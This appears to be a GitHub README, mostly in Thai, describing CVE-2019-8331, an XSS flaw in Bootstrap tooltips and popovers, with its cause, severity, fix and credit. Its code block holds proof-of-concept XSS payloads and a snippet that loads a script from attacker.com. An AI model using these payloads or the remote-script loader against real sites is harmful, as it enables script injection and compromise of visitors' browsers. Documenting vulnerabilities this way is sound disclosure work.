#### [Eng](https://github.com/Thampakon/CVE-2019-8331/blob/main/READMEENG.md)
## อธิบาย

**CVE-2019-8331 เป็นช่องโหว่ด้านความปลอดภัยประเภท Cross-Site Scripting (XSS) พบใน Bootstrap ซึ่งเป็นไลบรารี JavaScript ที่ใช้กันอย่างแพร่หลายในการพัฒนาเว็บไซต์และแอปพลิเคชันมือถือ ช่องโหว่นี้เกิดขึ้นเนื่องจาก Bootstrap ไม่ได้กรองข้อมูลอย่างเหมาะสมที่ส่งมากับแอตทริบิวต์ data-template ขององค์ประกอบ tooltip หรือ popover ทำให้ผู้โจมตีสามารถแทรกโค้ดที่เป็นอันตรายลงในหน้าเว็บได้**

**การโจมตีนี้สามารถเกิดขึ้นได้หากผู้โจมตีสามารถควบคุมข้อมูลที่จะแสดงเป็น tooltip หรือ popover ได้ เมื่อผู้ใช้เปิดใช้งาน tooltip หรือ popover โค้ดที่เป็นอันตรายจะถูกแทรกลงในหน้าเว็บและอาจถูกเรียกใช้โดยเบราว์เซอร์ของผู้ใช้**

**ช่องโหว่นี้ได้รับการแก้ไขใน Bootstrap เวอร์ชัน 4.3.1 และ 5.0.0-beta2 ผู้ดูแลระบบควรอัปเดต Bootstrap เวอร์ชันที่ได้รับผลกระทบเพื่อแก้ไขช่องโหว่นี้**

**รายละเอียดเพิ่มเติมเกี่ยวกับช่องโหว่ CVE-2019-8331:**

* **ประเภท: XSS**
* **ระดับความรุนแรง: กลาง**
* **ผลกระทบ: แทรก Code อัตราย**
* **ตำแหน่ง: Client**
* **วิธีแก้: อัพเดต Bootstrap**

```
<x data-toggle="tooltip" data-template="<img src=x onerror=alert(1)>">XSS</x>
<x data-toggle="tooltip" data-html="true" title='<script>alert(1)</script>'>XSS</x>
<x data-toggle="tooltip" data-html="true" data-content='<script>alert(1)</script>'>XSS</x>

<script>
  var script = document.createElement("script");
  script.src = "https://attacker.com/malicious.js";
  document.body.appendChild(script);
</script>
```

## Credit
[BlackFan](https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6)
